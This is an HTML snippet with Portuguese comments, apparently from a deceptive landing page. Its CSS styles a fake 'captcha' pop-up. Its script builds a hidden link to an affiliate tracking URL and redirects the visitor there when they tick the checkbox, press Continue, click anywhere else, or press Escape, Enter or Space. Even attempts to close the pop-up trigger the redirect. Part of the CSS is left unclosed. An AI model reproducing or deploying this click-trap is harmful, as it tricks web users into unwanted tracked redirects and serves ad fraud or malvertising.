<style type="text/css">

/* Customização do Pop-up */
.captcha-popup-container-modern {
  background: white !important;
  border: 5px solid #062853 !important;
  border-radius: 8px !important;
  max-width: 360px !important;
}

.captcha-popup-title-modern {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
  font-weight: 400 !important;
  color: #1f2937 !important;
}

.captcha-popup-subtitle-modern {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
  color: #6b7280 !important;
}

.captcha-text-modern {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;

.captcha-checkbox-modern:checked {

</style>
  
<script type="text/javascript">
(function(){
  'use strict';
  
  let clickFired = false;

  // 1) Cria link trackable invisível
  const currentUrl = new URL(window.location.href);
  const params = new URLSearchParams(currentUrl.search);
  const sep = "https://www.earthwolftrack.com/32Z9NG21/23Q92KSM/".includes('?') ? '&' : '?';
  const finalUrl = "https://www.earthwolftrack.com/32Z9NG21/23Q92KSM/" + (params.toString() ? sep + params.toString() : '');
  
  const realLink = document.createElement('a');
  realLink.href = finalUrl;
  realLink.target = '_self';
  realLink.className = 'ratoeira-trackable';
  realLink.style.display = 'none';
  document.body.appendChild(realLink);

  // 2) Função de redirect
  function doRedirect(){
    if (clickFired) return;
    clickFired = true;
    realLink.click();
  }

  // 3) Mostra popup
  function showPopup(){
    const popup = document.getElementById('captcha-popup-modern');
    if (popup) popup.style.display = 'flex';
  }

  // 4) Inicializa checkbox e botão Continue
  function initPopup(){
    showPopup();

    const checkbox = document.getElementById('captcha-checkbox-modern');
    const continueBtn = document.querySelector('.captcha-continue-button-modern');

    if (checkbox){
      checkbox.addEventListener('change', () => {
        if (!clickFired && checkbox.checked){
          setTimeout(doRedirect, 500);
        }
      });
    }

    if (continueBtn){
      continueBtn.addEventListener('click', function(e){
        e.preventDefault();
        doRedirect();
      });
    }
  }

  // 5) Listener global de clique (bubbling!)
  document.body.addEventListener('click', (e) => {
    if (clickFired) return;

    // se clicou no próprio checkbox, label ou botão Continue, ignora
    if (e.target.closest('#captcha-checkbox-modern, .captcha-checkbox-label-modern, .captcha-continue-button-modern')) {
      return;
    }
    // qualquer outro clique dispara
    doRedirect();
  });

  // 6) Escuta ESC / Enter / Space
  document.addEventListener('keydown', (e) => {
    if (clickFired) return;
    if (['Escape','Enter',' '].includes(e.key)){
      doRedirect();
    }
  });

  // 7) Inicia
  if (document.readyState === 'loading'){
    document.addEventListener('DOMContentLoaded', initPopup);
  } else {
    initPopup();
  }
})();
</script>
  
</body>
